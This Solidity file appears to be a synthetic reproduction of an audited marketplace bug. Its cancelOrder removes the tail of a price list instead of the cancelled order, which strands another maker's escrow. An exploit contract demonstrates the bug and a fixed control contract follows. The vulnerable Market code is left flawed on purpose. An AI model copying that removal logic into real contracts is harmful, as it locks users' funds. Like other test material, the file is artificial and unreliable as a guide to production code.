// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  TalentirMarketplaceV1 — _removeOrder pops the tail of the price list
    instead of the order id (Quantstamp / Zeeshan Meghji, finding #60731).

    SYNTHETIC, cheatcode-free. push(id, true) inserts at the front. pop(false)
    removes the oldest id. Canceling the newer order B refunds B and unlinks
    the older order A. A is no longer on the book, so it cannot be canceled
    or filled, and its 100 TOKEN escrow stays in the market. Control removes
    the requested id. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    struct Order {
        address maker;
        uint256 amount;
        uint256 price;
        bool active;
        bool onBook;
    }

    Token public token;
    uint256 public nextId;
    mapping(uint256 => Order) public orders;
    mapping(uint256 => uint256[]) internal lists;

    constructor(Token _token) {
        token = _token;
    }

    function addOrder(uint256 price, uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = ++nextId;
        orders[id] = Order(msg.sender, amount, price, true, true);
        _pushFront(price, id);
    }

    function cancelOrder(uint256 orderId) external {
        Order storage o = orders[orderId];
        require(o.maker == msg.sender, "maker");
        require(o.active && o.onBook, "open");
        o.active = false;
        o.onBook = false;
        token.transfer(msg.sender, o.amount);
        // @> VULN: pop(false) drops the tail, not this order id
        uint256 removed = _popBack(o.price);
        if (removed != orderId) orders[removed].onBook = false;
    }

    function getBestOrder(uint256 price) external view returns (uint256) {
        uint256[] storage list = lists[price];
        require(list.length > 0, "empty");
        return list[list.length - 1];
    }

    function _pushFront(uint256 price, uint256 id) internal {
        uint256[] storage list = lists[price];
        list.push(0);
        for (uint256 i = list.length - 1; i > 0; i--) {
            list[i] = list[i - 1];
        }
        list[0] = id;
    }

    function _popBack(uint256 price) internal returns (uint256 id) {
        uint256[] storage list = lists[price];
        id = list[list.length - 1];
        list.pop();
    }
}

contract Exploit {
    uint256 public constant A_AMT = 100 ether;
    uint256 public constant B_AMT = 40 ether;
    uint256 public constant PRICE = 1;

    Token public token;
    Market public market;
    uint256 public idA;
    uint256 public idB;
    uint256 public stuck;
    uint256 public refunded;

    constructor() {
        token = new Token("Talent", "TLNT", 18);
        market = new Market(token);
        token.mint(address(this), A_AMT + B_AMT);
    }

    function run() external {
        token.approve(address(market), A_AMT + B_AMT);
        idA = market.addOrder(PRICE, A_AMT);
        idB = market.addOrder(PRICE, B_AMT);
        uint256 before = token.balanceOf(address(this));
        market.cancelOrder(idB);
        refunded = token.balanceOf(address(this)) - before;
        stuck = token.balanceOf(address(market));
        (,,, bool activeA, bool onBookA) = market.orders(idA);
        require(refunded == B_AMT, "B was not refunded");
        require(activeA, "A was marked canceled");
        require(!onBookA, "A stayed on the book");
        require(stuck == A_AMT, "A escrow was released");
        require(market.getBestOrder(PRICE) == idB, "best order is not the leftover");
        (bool again,) = address(market).call(abi.encodeWithSelector(Market.cancelOrder.selector, idA));
        require(!again, "A could still be canceled");
    }
}

/// @dev Control: cancel removes the requested id from the list.
contract MarketFixed {
    struct Order {
        address maker;
        uint256 amount;
        uint256 price;
        bool active;
        bool onBook;
    }

    Token public token;
    uint256 public nextId;
    mapping(uint256 => Order) public orders;
    mapping(uint256 => uint256[]) internal lists;

    constructor(Token _token) {
        token = _token;
    }

    function addOrder(uint256 price, uint256 amount) external returns (uint256 id) {
        token.transferFrom(msg.sender, address(this), amount);
        id = ++nextId;
        orders[id] = Order(msg.sender, amount, price, true, true);
        lists[price].push(id);
    }

    function cancelOrder(uint256 orderId) external {
        Order storage o = orders[orderId];
        require(o.maker == msg.sender && o.active && o.onBook, "open");
        o.active = false;
        o.onBook = false;
        token.transfer(msg.sender, o.amount);
        uint256[] storage list = lists[o.price];
        for (uint256 i; i < list.length; i++) {
            if (list[i] == orderId) {
                list[i] = list[list.length - 1];
                list.pop();
                break;
            }
        }
    }
}
